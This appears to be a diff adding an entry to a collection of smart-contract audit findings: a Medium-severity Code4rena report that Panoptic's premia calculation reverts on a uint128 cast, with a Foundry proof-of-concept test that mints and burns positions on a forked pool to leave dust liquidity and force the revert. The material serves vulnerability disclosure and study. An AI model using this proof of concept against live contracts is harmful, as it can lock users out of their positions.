@@ -248,3 +248,149 @@ function test_dispute_on_non_existing_sr() public {
 ```
 
 </details>
+
+## 4.[Medium] Premia calculation can cause DOS
+
+### Premia calculation
+
+- Summary: Premia calculation can cause a Denial of Service (DoS) for certain addresses. If removedLiquidity is high and netLiquidity is extremely low, the calculation in `_getPremiaDeltas` will revert since the amount cannot be cast to uint128.
+
+- Impact & Recommendation: Modify the premia calculation to handle these edge cases and use uint256 for storing premia to avoid casting issues.
+  <br> 🐬: [Source](https://code4rena.com/reports/2023-11-panoptic#m-01-premia-calculation-can-cause-dos) & [Report](https://code4rena.com/reports/2023-11-panoptic)
+
+<details><summary>POC</summary>
+
+```solidity
+diff --git a/test/foundry/core/SemiFungiblePositionManager.t.sol b/test/foundry/core/SemiFungiblePositionManager.t.sol
+index 5f09101..e9eef27 100644
+--- a/test/foundry/core/SemiFungiblePositionManager.t.sol
++++ b/test/foundry/core/SemiFungiblePositionManager.t.sol
+@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
+ import {stdMath} from "forge-std/StdMath.sol";
+ import {Errors} from "@libraries/Errors.sol";
+ import {Math} from "@libraries/Math.sol";
+-import {PanopticMath} from "@libraries/PanopticMath.sol";
++import {PanopticMath,LiquidityChunk} from "@libraries/PanopticMath.sol";
+ import {CallbackLib} from "@libraries/CallbackLib.sol";
+ import {TokenId} from "@types/TokenId.sol";
+ import {LeftRight} from "@types/LeftRight.sol";
+@@ -55,7 +55,7 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
+     using LeftRight for uint256;
+     using LeftRight for uint128;
+     using LeftRight for int256;
+-
++    using LiquidityChunk for uint256;
+     /*//////////////////////////////////////////////////////////////
+                            MAINNET CONTRACTS
+     //////////////////////////////////////////////////////////////*/
+@@ -79,6 +79,7 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
+         IUniswapV3Pool(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD);
+     IUniswapV3Pool constant USDC_WETH_30 =
+         IUniswapV3Pool(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8);
++    IUniswapV3Pool constant PEPE_WETH_30 = IUniswapV3Pool(0x11950d141EcB863F01007AdD7D1A342041227b58);
+     IUniswapV3Pool[3] public pools = [USDC_WETH_5, USDC_WETH_5, USDC_WETH_30];
+
+     /*//////////////////////////////////////////////////////////////
+@@ -189,7 +190,8 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
+     /// @notice Set up world state with data from a random pool off the list and fund+approve actors
+     function _initWorld(uint256 seed) internal {
+         // Pick a pool from the seed and cache initial state
+-        _cacheWorldState(pools[bound(seed, 0, pools.length - 1)]);
++        // _cacheWorldState(pools[bound(seed, 0, pools.length - 1)]);
++        _cacheWorldState(PEPE_WETH_30);
+
+         // Fund some of the the generic actor accounts
+         vm.startPrank(Bob);
+@@ -241,6 +243,93 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
+         sfpm = new SemiFungiblePositionManagerHarness(V3FACTORY);
+     }
+
++    function testHash_PremiaRevertDueToLowNetHighLiquidity() public {
++        _initWorld(0);
++        vm.stopPrank();
++        sfpm.initializeAMMPool(token0, token1, fee);
++
++        deal(token0, address(this), type(uint128).max);
++        deal(token1, address(this), type(uint128).max);
++
++        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
++        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);
++
++        int24 strike = ((currentTick / tickSpacing) * tickSpacing) + 3 * tickSpacing;
++        int24 width = 2;
++        int24 lowTick = strike - tickSpacing;
++        int24 highTick = strike + tickSpacing;
++
++        uint256 shortTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, 0, 0, 0, 0, strike, width);
++
++        uint128 posSize = 100_000_000e18; // gives > 2**71 liquidity ~$100
++
++        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
++
++        uint256 accountLiq = sfpm.getAccountLiquidity(address(PEPE_WETH_30), address(this), 0, lowTick, highTick);
++
++        assert(accountLiq.rightSlot() > 2 ** 71);
++
++        // the added liquidity is removed leaving some dust behind
++        uint256 longTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, 0, 1, 0, 0, strike, width);
++        sfpm.mintTokenizedPosition(longTokenId, posSize / 2, type(int24).min, type(int24).max);
++        sfpm.mintTokenizedPosition(longTokenId, posSize / 2 , type(int24).min, type(int24).max);
++
++        // fees is accrued on the position
++        vm.startPrank(Swapper);
++        uint256 amountReceived = router.exactInputSingle(
++            ISwapRouter.ExactInputSingleParams(token1, token0, fee, Bob, block.timestamp, 100e18, 0, 0)
++        );
++        (, int24 tickAfterSwap,,,,,) = pool.slot0();
++        assert(tickAfterSwap > lowTick);
++
++
++        router.exactInputSingle(
++            ISwapRouter.ExactInputSingleParams(token0, token1, fee, Bob, block.timestamp, amountReceived, 0, 0)
++        );
++        vm.stopPrank();
++
++        // further mints will revert due to amountToCollect being non-zero and premia calculation reverting
++        vm.expectRevert(Errors.CastingError.selector);
++        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
++    }
++
++    function testHash_DustLiquidityAmount() public {
++        int24 tickLower = 199260;
++        int24 tickUpper = 199290;
++
++        /*
++            amount0 219738690
++            liquidity initial 3110442974185905
++            liquidity withdraw 3110442974185904
++        */
++
++        uint amount0 = 219738690;
++
++        uint128 liquidityMinted = Math.getLiquidityForAmount0(
++                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
++                amount0
++            );
++
++        // remove liquidity in pieces
++        uint halfAmount = amount0/2;
++        uint remaining = amount0-halfAmount;
++
++        uint128 liquidityRemoval1 = Math.getLiquidityForAmount0(
++                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
++                halfAmount
++            );
++        uint128 liquidityRemoval2 = Math.getLiquidityForAmount0(
++                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
++                remaining
++            );
++
++        assert(liquidityMinted - (liquidityRemoval1 + liquidityRemoval2) > 0);
++    }
++
++    function onERC1155Received(address, address, uint256 id, uint256, bytes memory) public returns (bytes4) {
++        return this.onERC1155Received.selector;
++    }
++
+
+```
